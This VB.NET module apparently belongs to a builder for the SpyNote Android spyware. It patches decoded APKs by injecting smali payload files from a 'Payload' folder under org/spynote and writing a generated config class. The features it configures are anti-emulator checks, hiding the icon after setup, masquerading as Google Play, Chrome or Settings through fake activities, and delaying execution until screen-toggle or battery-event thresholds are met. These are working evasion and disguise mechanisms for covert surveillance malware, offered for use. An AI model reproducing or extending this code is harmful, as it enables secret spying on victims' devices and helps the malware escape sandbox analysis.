Imports System.IO
Imports System.Text

Public Module ApkProtectionPatcher
    Public Class ProtectionConfig
        Public Enabled As Boolean
        Public HideIconAfterSetup As Boolean
        Public AntiEmulator As Boolean
        Public MaskType As String
        Public PackageName As String
        Public FakeActivity As String
        Public PermissionFlags As String
        Public StealthEnabled As Boolean
        Public ObfuscateSmali As Boolean
        Public EncryptStrings As Boolean
        Public MaskManifest As Boolean
        Public DelayedExecution As Boolean
        Public DelayMinutes As Integer
        Public DelayScreenToggles As Integer
        Public DelayBatteryEvents As Integer
        Public MaskPackageAlias As String
    End Class

    Public Function NeedsSmaliPatch(cfg As ProtectionConfig) As Boolean
        If cfg Is Nothing Then Return False
        Return cfg.Enabled OrElse cfg.StealthEnabled
    End Function

    Public Function ResolveMaskLabel(maskType As String) As String
        If String.IsNullOrWhiteSpace(maskType) Then Return Nothing
        Select Case maskType.Trim().ToLowerInvariant()
            Case "google play" : Return "Google Play Store"
            Case "chrome" : Return "Chrome"
            Case "settings" : Return "Settings"
            Case "game" : Return "Game Center"
            Case Else : Return Nothing
        End Select
    End Function

    Public Function ResolveFakeActivity(cfg As ProtectionConfig) As String
        If cfg Is Nothing Then Return Nothing
        If Not String.IsNullOrWhiteSpace(cfg.FakeActivity) Then Return cfg.FakeActivity.Trim()
        If String.IsNullOrWhiteSpace(cfg.MaskType) Then Return Nothing
        Select Case cfg.MaskType.Trim().ToLowerInvariant()
            Case "settings" : Return "com.android.settings/.Settings"
            Case "chrome" : Return "com.android.chrome/com.google.android.apps.chrome.Main"
            Case "google play" : Return "com.android.vending/com.android.vending.AssetBrowserActivity"
            Case "game" : Return "com.android.settings/.Settings"
            Case Else : Return Nothing
        End Select
    End Function

    Public Function BuildProtectionConfigText(cfg As ProtectionConfig) As String
        If cfg Is Nothing Then cfg = New ProtectionConfig()
        Dim fake As String = ResolveFakeActivity(cfg)
        Dim sb As New StringBuilder()
        sb.AppendLine("enabled=" & If(cfg.Enabled, "true", "false"))
        sb.AppendLine("antiemulator=" & If(cfg.AntiEmulator, "true", "false"))
        sb.AppendLine("delayms=15000")
        sb.AppendLine("delayenabled=" & If(cfg.DelayedExecution, "true", "false"))
        sb.AppendLine("delayminutes=" & Math.Max(0, cfg.DelayMinutes).ToString())
        sb.AppendLine("screentoggles=" & Math.Max(0, cfg.DelayScreenToggles).ToString())
        sb.AppendLine("batteryevents=" & Math.Max(0, cfg.DelayBatteryEvents).ToString())
        sb.AppendLine("fakeactivity=" & If(fake, String.Empty))
        Return sb.ToString()
    End Function

    Public Sub EnsureProtectionRuntime(decodeDir As String, cfg As ProtectionConfig)
        If String.IsNullOrWhiteSpace(decodeDir) OrElse Not Directory.Exists(decodeDir) Then Return
        CopyProtectionSmali(decodeDir)
        If NeedsSmaliPatch(cfg) Then
            WriteProtectionConfigSmali(decodeDir, cfg)
        Else
            WriteProtectionConfigSmali(decodeDir, New ProtectionConfig With {.Enabled = False})
        End If
    End Sub

    Public Sub ApplyProtectionPatch(decodeDir As String, cfg As ProtectionConfig)
        EnsureProtectionRuntime(decodeDir, cfg)
    End Sub

    Private Function EscapeForSmaliString(value As String) As String
        If value Is Nothing Then Return String.Empty
        Return value.Replace("\", "\\").Replace("""", "\""").Replace(vbCr, "").Replace(vbLf, "\n").Replace(vbTab, "\t")
    End Function

    Private Sub WriteProtectionConfigSmali(decodeDir As String, cfg As ProtectionConfig)
        Dim smaliDir As String = Path.Combine(decodeDir, "smali", "org", "spynote")
        Directory.CreateDirectory(smaliDir)

        Dim lines As String() = BuildProtectionConfigText(cfg).Split(New String() {vbCrLf, vbLf, vbCr}, StringSplitOptions.RemoveEmptyEntries)
        Dim sb As New StringBuilder()
        sb.AppendLine(".class public Lorg/spynote/ProtectionConfig;")
        sb.AppendLine(".super Ljava/lang/Object;")
        sb.AppendLine(".source ""ProtectionConfig.java""")
        sb.AppendLine()
        sb.AppendLine(".method public static getConfig()Ljava/lang/String;")
        sb.AppendLine("    .locals 2")
        sb.AppendLine("    new-instance v0, Ljava/lang/StringBuilder;")
        sb.AppendLine("    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V")

        For Each line As String In lines
            Dim piece As String = EscapeForSmaliString(line.Trim()) & "\n"
            sb.AppendLine("    const-string v1, """ & piece & """")
            sb.AppendLine("    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;")
        Next

        sb.AppendLine("    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;")
        sb.AppendLine("    move-result-object v0")
        sb.AppendLine("    return-object v0")
        sb.AppendLine(".end method")

        File.WriteAllText(Path.Combine(smaliDir, "ProtectionConfig.smali"), sb.ToString(), New UTF8Encoding(False))
    End Sub

    Private Sub CopyProtectionSmali(decodeDir As String)
        Dim searchDirs As String() = {
            Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Resources", "Imports", "Payload", "notify_smali"),
            Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Resources", "Imports", "Payload", "protection_smali")
        }

        Dim files As String() = {
            "EmulatorGuard.smali",
            "ProtectionRuntime.smali",
            "AppBootstrap.smali",
            "BootstrapWorker.smali"
        }

        For Each candidate As String In searchDirs
            If Not Directory.Exists(candidate) Then Continue For
            Dim targetDir As String = Path.Combine(decodeDir, "smali", "org", "spynote")
            Directory.CreateDirectory(targetDir)
            Dim copied As Boolean = False
            For Each fileName As String In files
                Dim source As String = Path.Combine(candidate, "org", "spynote", fileName)
                If File.Exists(source) Then
                    File.Copy(source, Path.Combine(targetDir, fileName), True)
                    copied = True
                End If
            Next
            If copied Then Return
        Next
    End Sub
End Module
